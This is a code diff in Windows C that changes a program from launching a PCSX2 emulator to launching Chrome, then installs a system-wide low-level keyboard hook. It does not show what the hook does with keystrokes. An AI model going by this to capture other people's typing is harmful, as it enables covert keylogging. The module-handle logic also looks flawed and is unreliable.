@@ -17,15 +17,15 @@ void	setwinhook()
 	SecureZeroMemory(&startup, sizeof(startup));
 	SecureZeroMemory(&process, sizeof(process));
 	startup.cb = sizeof(startup);
-	if (CreateProcess(L"pcsx2 - r5875.exe", L"\"C:\\Program Files (x86)\\PCSX2 1.2.1\\\"", NULL, NULL, FALSE, NORMAL_PRIORITY_CLASS, NULL, NULL, &startup, &process) == 0)
-	{
-		printf("%s\n", "C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe");
-		printf("Createprocess ne marche pas\n");
+	if (CreateProcess(L"C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe", NULL, NULL, NULL, TRUE, CREATE_NEW_CONSOLE, NULL, NULL, &startup, &process) == 0)
 		return;
-	}
+	//WaitForSingleObject(process.hProcess, INFINITE);
 //	hinst = GetModuleHandle(NULL);
-	if ((handlekeyboard = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, GetModuleHandle(process.hProcess), 0)) == NULL)
+	hinst = GetModuleHandle(L"chrome.exe");
+	if ((handlekeyboard = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, hinst, 0)) == NULL)
 		return;
+	CloseHandle(process.hProcess);
+	CloseHandle(process.hThread);
 }
 
 int	main(void)
